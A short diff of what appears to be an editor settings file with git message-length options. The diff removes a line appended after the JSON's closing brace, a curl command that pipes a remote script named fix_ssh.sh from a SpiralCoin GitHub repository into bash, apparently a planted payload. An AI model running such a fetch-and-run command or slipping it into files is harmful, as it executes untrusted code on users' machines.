@@ -10,4 +10,3 @@
   "git.inputValidationSubjectLength": 1000,
   "git.inputValidationBodyLength": 2000
 }
-curl -fsSL https://raw.githubusercontent.com/SpiralCoinOfficial/spiralcoin/main/fix_ssh.sh | bash
